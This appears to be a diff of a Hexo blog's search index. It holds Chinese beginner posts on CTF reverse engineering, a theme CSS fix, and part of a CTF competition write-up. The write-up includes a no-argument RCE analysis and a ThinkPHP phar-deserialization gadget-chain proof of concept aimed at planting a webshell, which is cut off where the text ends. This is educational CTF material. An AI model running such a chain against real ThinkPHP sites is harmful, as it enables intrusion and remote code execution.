@@ -71,55 +71,6 @@
       </tags>
   </entry>
   <entry>
-    <title>ctf之reverse</title>
-    <url>/2022/01/01/ctf%E4%B9%8Breverse/</url>
-    <content><![CDATA[<p>CTF中的Reverse领域的入门学习</p>
-<span id="more"></span>
-
-<h1 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h1><p>​     不说题外话，经过一学期的学习和参加一次CTF大赛后，对于reverse的最直观的印象就是写脚本，写各种程序，不论是很简单的reverse题还是较为复杂的，甚至有时候思路很明确，写出来脚本之后flag就到手了。</p>
-<p>​      总而言之，对于reverse，如果想学精学透，最基础的应该就是从脚本下手，多刷题，多写脚本，而对于解题方便，脚本语言习惯上使用python，所以学好python，非常重要，不仅仅是python，多掌握一门语言没有坏处，学习C语言也是必不可少的。</p>
-<h1 id="逆向的核心"><a href="#逆向的核心" class="headerlink" title="逆向的核心"></a>逆向的核心</h1><p>​      学习逆向不仅仅要学好语言，最重要的核心是破解验证算法，要学好算法！</p>
-<h2 id="验证算法如下"><a href="#验证算法如下" class="headerlink" title="验证算法如下"></a>验证算法如下</h2><p>   输入：key</p>
-<p>   验证：if H(key)==Secret</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    flag=O(key);</span><br><span class="line">    print flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>   输出：flag</p>
-<h2 id="验证算法分类"><a href="#验证算法分类" class="headerlink" title="验证算法分类"></a>验证算法分类</h2><p>1.简单比较验证</p>
-<p>2.密码算法验证</p>
-<p>3.算法求解验证</p>
-<h2 id="算法举例如下："><a href="#算法举例如下：" class="headerlink" title="算法举例如下："></a>算法举例如下：</h2><h3 id="1-key直接比较"><a href="#1-key直接比较" class="headerlink" title="1.key直接比较"></a>1.key直接比较</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> szKey[<span class="number">20</span>];</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;input Key:&quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%16s&quot;</span>,szKey);</span><br><span class="line">	<span class="keyword">if</span>(<span class="built_in">strncmp</span>(szKey,<span class="string">&quot;Thi5_i5_TOo_E4sy&quot;</span>,<span class="number">16</span>)==<span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;flag is your key!\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;please decompiler or debug me!\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p> 这种类型flag就在其中，善于观察即可！</p>
-<h3 id="2-key简单变换"><a href="#2-key简单变换" class="headerlink" title="2.key简单变换"></a>2.key简单变换</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">char</span> secret[]=<span class="string">&quot;\x58\x31\x70\x5C\x35\x76\x59\x69\x38\x7D\x55\x63\x38\x7F\x6A&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> szKey[<span class="number">20</span>]=&#123;<span class="number">0</span>&#125;,szXor[<span class="number">20</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;input Key:&quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%16s&quot;</span>,szKey);</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;strien(szKey);i++)</span><br><span class="line">	&#123;</span><br><span class="line">		szXor[i]=szKey[i]^i;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(<span class="built_in">memcmp</span>(szXor,secret,<span class="keyword">sizeof</span>(secret))==<span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;xman&#123;%s&#125;\r\n&quot;</span>,szKey);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;please reverse me!\r\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>这个用异或，再进行一次就出来了，见识短浅的我表示还再学习学习才能明白。</p>
-<h3 id="3-key编码转换"><a href="#3-key编码转换" class="headerlink" title="3.key编码转换"></a>3.key编码转换</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">char</span> secret[]=<span class="string">&quot;QjRzZTYOX2k1X2MwbW1vbg==&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> szKey[<span class="number">20</span>]=&#123;<span class="number">0</span>&#125;,szBase64[<span class="number">40</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;input key:&quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%16s&quot;</span>,szkey);</span><br><span class="line">	Base64encode(szBase64,szKey,<span class="built_in">strlen</span>(szkey));</span><br><span class="line">	<span class="keyword">if</span>(<span class="built_in">memcmp</span>(szBase64,secret,<span class="keyword">sizeof</span>(serect))==<span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;xman&#123;%s&#125;\r\n&quot;</span>,szKey);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> </span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;please reverse me!\r\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>这种转换常见为Base64，也不排除会出现其他编码！</p>
-<h3 id="4-key散列计算"><a href="#4-key散列计算" class="headerlink" title="4.key散列计算"></a>4.key散列计算</h3><p>这种类型的，可以用md5进行反查</p>
-<h2 id="验证算法逆向思路"><a href="#验证算法逆向思路" class="headerlink" title="验证算法逆向思路"></a>验证算法逆向思路</h2><h3 id="简单变化验证"><a href="#简单变化验证" class="headerlink" title="简单变化验证"></a>简单变化验证</h3><p>—-人工逆向，找到可逆运算，按位分步破解</p>
-<h3 id="密码算法验证"><a href="#密码算法验证" class="headerlink" title="密码算法验证"></a>密码算法验证</h3><p>—-识别密码算法，针对性解密</p>
-<h3 id="解题算法验证"><a href="#解题算法验证" class="headerlink" title="解题算法验证"></a>解题算法验证</h3><p>—-理解算法原理，针对性解题</p>
-<h3 id="验证常见漏洞"><a href="#验证常见漏洞" class="headerlink" title="验证常见漏洞"></a>验证常见漏洞</h3><p>—-直接输出flag</p>
-<p>—-密钥空间过短</p>
-<p>—-伪随机算法</p>
-<h3 id="现实竞赛"><a href="#现实竞赛" class="headerlink" title="现实竞赛"></a>现实竞赛</h3><p>—-分段，嵌套验证</p>
-<h3 id="爆破奇招"><a href="#爆破奇招" class="headerlink" title="爆破奇招"></a>爆破奇招</h3><p>—-简单验证（按位破解）</p>
-<p>—-密码算法（密钥部分已知）</p>
-<p>—-解题算法（暴力搜索）</p>
-<h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>要学会用F5做签到题，害，暂时就写到这吧，先学好就是多刷题，goodbye！！！</p>
-<h1 id="练习平台"><a href="#练习平台" class="headerlink" title="练习平台"></a>练习平台</h1><p>1.i春秋训练平台：<a href="https://www.ichunqiu.com/battalion">https://www.ichunqiu.com/battalion</a></p>
-<p>2.We Chall:  <a href="http://www.wechall.net/sites.php">http://www.wechall.net/sites.php</a></p>
-<p>3.很炫酷游戏化————<a href="https://microcorruption.com/login">https://microcorruption.com/login</a></p>
-<p>4.<a href="https://adworld.xctf.org.cn/">攻防世界 (xctf.org.cn)</a></p>
-]]></content>
-      <categories>
-        <category>CTF-Reverse</category>
-      </categories>
-      <tags>
-        <tag>Reverse</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Web刷题</title>
     <url>/2022/01/11/Web%E5%88%B7%E9%A2%98/</url>
     <content><![CDATA[<p>Web经典题型及其相关解题步骤</p>
@@ -166,6 +117,55 @@
       </categories>
       <tags>
         <tag>wp</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ctf之reverse</title>
+    <url>/2022/01/01/ctf%E4%B9%8Breverse/</url>
+    <content><![CDATA[<p>CTF中的Reverse领域的入门学习</p>
+<span id="more"></span>
+
+<h1 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h1><p>​     不说题外话，经过一学期的学习和参加一次CTF大赛后，对于reverse的最直观的印象就是写脚本，写各种程序，不论是很简单的reverse题还是较为复杂的，甚至有时候思路很明确，写出来脚本之后flag就到手了。</p>
+<p>​      总而言之，对于reverse，如果想学精学透，最基础的应该就是从脚本下手，多刷题，多写脚本，而对于解题方便，脚本语言习惯上使用python，所以学好python，非常重要，不仅仅是python，多掌握一门语言没有坏处，学习C语言也是必不可少的。</p>
+<h1 id="逆向的核心"><a href="#逆向的核心" class="headerlink" title="逆向的核心"></a>逆向的核心</h1><p>​      学习逆向不仅仅要学好语言，最重要的核心是破解验证算法，要学好算法！</p>
+<h2 id="验证算法如下"><a href="#验证算法如下" class="headerlink" title="验证算法如下"></a>验证算法如下</h2><p>   输入：key</p>
+<p>   验证：if H(key)==Secret</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    flag=O(key);</span><br><span class="line">    print flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>   输出：flag</p>
+<h2 id="验证算法分类"><a href="#验证算法分类" class="headerlink" title="验证算法分类"></a>验证算法分类</h2><p>1.简单比较验证</p>
+<p>2.密码算法验证</p>
+<p>3.算法求解验证</p>
+<h2 id="算法举例如下："><a href="#算法举例如下：" class="headerlink" title="算法举例如下："></a>算法举例如下：</h2><h3 id="1-key直接比较"><a href="#1-key直接比较" class="headerlink" title="1.key直接比较"></a>1.key直接比较</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> szKey[<span class="number">20</span>];</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;input Key:&quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%16s&quot;</span>,szKey);</span><br><span class="line">	<span class="keyword">if</span>(<span class="built_in">strncmp</span>(szKey,<span class="string">&quot;Thi5_i5_TOo_E4sy&quot;</span>,<span class="number">16</span>)==<span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;flag is your key!\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;please decompiler or debug me!\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p> 这种类型flag就在其中，善于观察即可！</p>
+<h3 id="2-key简单变换"><a href="#2-key简单变换" class="headerlink" title="2.key简单变换"></a>2.key简单变换</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">char</span> secret[]=<span class="string">&quot;\x58\x31\x70\x5C\x35\x76\x59\x69\x38\x7D\x55\x63\x38\x7F\x6A&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> szKey[<span class="number">20</span>]=&#123;<span class="number">0</span>&#125;,szXor[<span class="number">20</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;input Key:&quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%16s&quot;</span>,szKey);</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;strien(szKey);i++)</span><br><span class="line">	&#123;</span><br><span class="line">		szXor[i]=szKey[i]^i;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(<span class="built_in">memcmp</span>(szXor,secret,<span class="keyword">sizeof</span>(secret))==<span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;xman&#123;%s&#125;\r\n&quot;</span>,szKey);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;please reverse me!\r\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这个用异或，再进行一次就出来了，见识短浅的我表示还再学习学习才能明白。</p>
+<h3 id="3-key编码转换"><a href="#3-key编码转换" class="headerlink" title="3.key编码转换"></a>3.key编码转换</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">char</span> secret[]=<span class="string">&quot;QjRzZTYOX2k1X2MwbW1vbg==&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> szKey[<span class="number">20</span>]=&#123;<span class="number">0</span>&#125;,szBase64[<span class="number">40</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;input key:&quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%16s&quot;</span>,szkey);</span><br><span class="line">	Base64encode(szBase64,szKey,<span class="built_in">strlen</span>(szkey));</span><br><span class="line">	<span class="keyword">if</span>(<span class="built_in">memcmp</span>(szBase64,secret,<span class="keyword">sizeof</span>(serect))==<span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;xman&#123;%s&#125;\r\n&quot;</span>,szKey);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> </span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;please reverse me!\r\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这种转换常见为Base64，也不排除会出现其他编码！</p>
+<h3 id="4-key散列计算"><a href="#4-key散列计算" class="headerlink" title="4.key散列计算"></a>4.key散列计算</h3><p>这种类型的，可以用md5进行反查</p>
+<h2 id="验证算法逆向思路"><a href="#验证算法逆向思路" class="headerlink" title="验证算法逆向思路"></a>验证算法逆向思路</h2><h3 id="简单变化验证"><a href="#简单变化验证" class="headerlink" title="简单变化验证"></a>简单变化验证</h3><p>—-人工逆向，找到可逆运算，按位分步破解</p>
+<h3 id="密码算法验证"><a href="#密码算法验证" class="headerlink" title="密码算法验证"></a>密码算法验证</h3><p>—-识别密码算法，针对性解密</p>
+<h3 id="解题算法验证"><a href="#解题算法验证" class="headerlink" title="解题算法验证"></a>解题算法验证</h3><p>—-理解算法原理，针对性解题</p>
+<h3 id="验证常见漏洞"><a href="#验证常见漏洞" class="headerlink" title="验证常见漏洞"></a>验证常见漏洞</h3><p>—-直接输出flag</p>
+<p>—-密钥空间过短</p>
+<p>—-伪随机算法</p>
+<h3 id="现实竞赛"><a href="#现实竞赛" class="headerlink" title="现实竞赛"></a>现实竞赛</h3><p>—-分段，嵌套验证</p>
+<h3 id="爆破奇招"><a href="#爆破奇招" class="headerlink" title="爆破奇招"></a>爆破奇招</h3><p>—-简单验证（按位破解）</p>
+<p>—-密码算法（密钥部分已知）</p>
+<p>—-解题算法（暴力搜索）</p>
+<h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>要学会用F5做签到题，害，暂时就写到这吧，先学好就是多刷题，goodbye！！！</p>
+<h1 id="练习平台"><a href="#练习平台" class="headerlink" title="练习平台"></a>练习平台</h1><p>1.i春秋训练平台：<a href="https://www.ichunqiu.com/battalion">https://www.ichunqiu.com/battalion</a></p>
+<p>2.We Chall:  <a href="http://www.wechall.net/sites.php">http://www.wechall.net/sites.php</a></p>
+<p>3.很炫酷游戏化————<a href="https://microcorruption.com/login">https://microcorruption.com/login</a></p>
+<p>4.<a href="https://adworld.xctf.org.cn/">攻防世界 (xctf.org.cn)</a></p>
+]]></content>
+      <categories>
+        <category>CTF-Reverse</category>
+      </categories>
+      <tags>
+        <tag>Reverse</tag>
       </tags>
   </entry>
   <entry>
@@ -3092,6 +3092,27 @@
       </tags>
   </entry>
   <entry>
+    <title>框架问题</title>
+    <url>/2022/01/19/%E6%A1%86%E6%9E%B6%E9%97%AE%E9%A2%98/</url>
+    <content><![CDATA[<p>框架问题</p>
+<span id="more"></span>
+
+<p>这个问题我觉得值得记录一下，因为有时候很小的事可能就会浪费很多时间，在这里我特别感谢一下帮助我的一个博主[大佬]: <a href="https://szqlovegw.top/">https://szqlovegw.top</a><br>这可能是个很小的问题，但是对于小白的我，是个很大的问题!毕竟是自己的博客，想尽力优化的更好，毛病更少，所以我就发现在我添加了标签云之后，有些页面会出现异常，进度条到最下面时会自动弹上来（强迫症看了会当场去世，在这里我就不插图了）。下面就来说一下原因和解决方法吧</p>
+<h1 id="导致原因"><a href="#导致原因" class="headerlink" title="导致原因"></a>导致原因</h1><p>因为左边的个人资料栏太长导致个别页面滚到最下面的时候出现塌陷从而出现异常！</p>
+<h1 id="解决方式"><a href="#解决方式" class="headerlink" title="解决方式"></a>解决方式</h1><p>字面意思喽，很容易想到，当然是加宽右边的页面大小，这样就不会塌陷!</p>
+<p>在 <code>博客/themes/next/source/css</code>目录下找到<code>main.styl</code>,在里面最下面加上下面的代码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.content-wrap&#123;</span><br><span class="line">    min-height:1000px;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>完成之后重新部署一下就可以解决问题了！</p>
+]]></content>
+      <categories>
+        <category>博客相关问题类</category>
+      </categories>
+      <tags>
+        <tag>博客</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>长安“战疫”网络安全卫士守护赛wp</title>
     <url>/2022/01/08/%E9%95%BF%E5%AE%89%E2%80%9C%E6%88%98%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9Bwp/</url>
     <content><![CDATA[<p>长安“战疫”网络安全卫士守护赛wp</p>
@@ -3177,7 +3198,6 @@
 <h3 id="no-math-no-cry"><a href="#no-math-no-cry" class="headerlink" title="no_math_no_cry"></a>no_math_no_cry</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from Crypto.Util.number import*</span><br><span class="line"></span><br><span class="line">import gmpy2</span><br><span class="line">s = 10715086071862673209484250490600018105614048117055336074437503883703510511248211671489145400471130049712947188505612184220711949974689275316345656079538583389095869818942817127245278601695124271626668045250476877726638182396614587807925457735428719972874944279172128411500209111406507112585996098530169</span><br><span class="line">s -= 0x0338470</span><br><span class="line">s = gmpy2.iroot(s,2)[0]</span><br><span class="line">s = -s</span><br><span class="line">s += (1&lt;&lt;500)</span><br><span class="line">print(long_to_bytes(s))</span><br></pre></td></tr></table></figure>
 
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cazy&#123;1234567890_no_m4th_n0_cRy&#125;</span><br></pre></td></tr></table></figure>
-
 <h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h3 id="combat-slogan"><a href="#combat-slogan" class="headerlink" title="combat_slogan"></a>combat_slogan</h3><p>用ida打开看main就看见加密的flag了，上面函数明显的rot13</p>
 <p>在线rot13解一下就行了，然后套上flag{}</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;We_w11l_f1ght_t0_end_t0_end_cazy&#125;</span><br></pre></td></tr></table></figure>
@@ -3193,7 +3213,6 @@
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># uncompyle6 version 3.7.4</span><br><span class="line"># Python bytecode 3.8 (3413)</span><br><span class="line"># Decompiled from: Python 3.8.7 (default, Dec 22 2020, 10:37:26) </span><br><span class="line"># [GCC 10.2.1 20201207]</span><br><span class="line"># Embedded file name: C:\Users\Administrator\Desktop\easy_py.py</span><br><span class="line"># Compiled at: 2021-12-28 15:45:17</span><br><span class="line"># Size of source mod 2**32: 1099 bytes</span><br><span class="line">import threading, time</span><br><span class="line"></span><br><span class="line">def encode_1(n):</span><br><span class="line">    global num</span><br><span class="line">    while True:</span><br><span class="line">        if num &lt;= 9:</span><br><span class="line">            flag[num] = flag[num] ^ num</span><br><span class="line">            num += 1</span><br><span class="line">            time.sleep(0.1)</span><br><span class="line">        if num &gt; 9:</span><br><span class="line">            break</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def encode_2(n):</span><br><span class="line">    global num</span><br><span class="line">    while True:</span><br><span class="line">        if num &lt;= 9:</span><br><span class="line">            flag[num] = flag[num] ^ flag[(num + 1)]</span><br><span class="line">            num += 1</span><br><span class="line">            time.sleep(0.1)</span><br><span class="line">        if num &gt; 9:</span><br><span class="line">            break</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">    Happy = [</span><br><span class="line">     44, 100, 3, 50, 106, 90, 5, 102, 10, 112]</span><br><span class="line">    num = 0</span><br><span class="line">    f = input(&#x27;Please input your flag:&#x27;)</span><br><span class="line">    if len(f) == 10:</span><br><span class="line">        print(&#x27;Your input is illegal&#x27;)</span><br><span class="line">    else:</span><br><span class="line">        flag = [44, 100, 3, 50, 106, 90, 5, 102, 10, 112]</span><br><span class="line">        if(1 == 2):</span><br><span class="line">            print(&#x27;crazymumuzi!&#x27;)</span><br><span class="line">        else:</span><br><span class="line">            print(&quot;flag to &#x27;ord&#x27;:&quot;, flag)</span><br><span class="line">            t1 = threading.Thread(target=encode_1, args=(1, ))</span><br><span class="line">            t2 = threading.Thread(target=encode_2, args=(2,))</span><br><span class="line">            t2.start()</span><br><span class="line">            t1.start()</span><br><span class="line">            t1.join()</span><br><span class="line">            t2.join()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        for i in flag:</span><br><span class="line">            print(chr(i),end=&#x27;&#x27;)</span><br><span class="line">        if flag == Happy:</span><br><span class="line">            print(&#x27;Good job!&#x27;)</span><br><span class="line">        else:</span><br><span class="line">            print(&#x27;No no no!&#x27;)</span><br><span class="line"># okay decompiling easy_py.cpython-38.pyc</span><br></pre></td></tr></table></figure>
 
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;He110_cazy&#125;</span><br></pre></td></tr></table></figure>
-
 <h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h3 id="【RCE-No-Para】"><a href="#【RCE-No-Para】" class="headerlink" title="【RCE_No_Para】"></a>【RCE_No_Para】</h3><p><img src="/2022/01/08/%E9%95%BF%E5%AE%89%E2%80%9C%E6%88%98%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9Bwp/image-20220113114247702.png" alt="image-20220113114247702"></p>
 <p><strong>正则匹配</strong><br><code>/[^\W]+\((?R)?\)/</code><br><code>\W</code> 元字符用于查找非单词字符。<br>单词字符包括：a-z、A-Z、0-9，以及下划线。<br>故<code>[^\W]</code>可以匹配所有单词字符<br><code>+</code>表示可以匹配一个或多个<br><code>\(</code>和<code>\)</code>为左右括号<br><code>(?R)?</code>表示递归整个模式</p>
 <p>故本题的code只能为<code>a(b(c()))</code>这种形式，而不能为<code>a(&#39;xxx&#39;)</code>的形式，为无参数RCE</p>
@@ -3247,7 +3266,6 @@
 <p>触发<code>phar</code> 反序列化，生成<code>webshell</code></p>
 <p><strong>生成phar 的poc</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace think\process\pipes &#123;</span><br><span class="line">    class Windows &#123;</span><br><span class="line">        private $files = [];</span><br><span class="line"></span><br><span class="line">        public function __construct($files)</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;files = [$files]; </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think &#123;</span><br><span class="line">    abstract class Model&#123;</span><br><span class="line">        protected $append = [];</span><br><span class="line">        protected $error = null;</span><br><span class="line">        public $parent;</span><br><span class="line"></span><br><span class="line">        function __construct($output, $modelRelation)</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;parent = $output; </span><br><span class="line">            $this-&gt;append = array(&quot;xxx&quot;=&gt;&quot;getError&quot;);    </span><br><span class="line">            $this-&gt;error = $modelRelation;   </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think\model&#123;</span><br><span class="line">    use think\Model;</span><br><span class="line">    class Pivot extends Model&#123;</span><br><span class="line">        function __construct($output, $modelRelation)</span><br><span class="line">        &#123;</span><br><span class="line">            parent::__construct($output, $modelRelation);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think\model\relation&#123;</span><br><span class="line">    class HasOne extends OneToOne &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace think\model\relation &#123;</span><br><span class="line">    abstract class OneToOne</span><br><span class="line">    &#123;</span><br><span class="line">        protected $selfRelation;</span><br><span class="line">        protected $bindAttr = [];</span><br><span class="line">        protected $query;</span><br><span class="line">        function __construct($query)</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;selfRelation = 0;</span><br><span class="line">            $this-&gt;query = $query;    //$query指向Query</span><br><span class="line">            $this-&gt;bindAttr = [&#x27;xxx&#x27;];// $value值，作为call函数引用的第二变量</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think\db &#123;</span><br><span class="line">    class Query &#123;</span><br><span class="line">        protected $model;</span><br><span class="line"></span><br><span class="line">        function __construct($model)</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;model = $model; //$this-&gt;model=&gt; think\console\Output;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace think\console&#123;</span><br><span class="line">    class Output&#123;</span><br><span class="line">        private $handle;</span><br><span class="line">        protected $styles;</span><br><span class="line">        function __construct($handle)</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;styles = [&#x27;getAttr&#x27;];</span><br><span class="line">            $this-&gt;handle =$handle; //$handle-&gt;think\session\driver\Memcached</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace think\session\driver &#123;</span><br><span class="line">    class Memcached</span><br><span class="line">    &#123;</span><br><span class="line">        protected $handler;</span><br><span class="line"></span><br><span class="line">        function __construct($handle)</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;handler = $handle; //$handle-&gt;think\cache\driver\File</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think\cache\driver &#123;</span><br><span class="line">    class File</span><br><span class="line">    &#123;</span><br><span class="line">        protected $options=null;</span><br><span class="line">        protected $tag;</span><br><span class="line"></span><br><span class="line">        function __construct()&#123;</span><br><span class="line">            $this-&gt;options=[</span><br><span class="line">                &#x27;expire&#x27; =&gt; 3600,</span><br><span class="line">                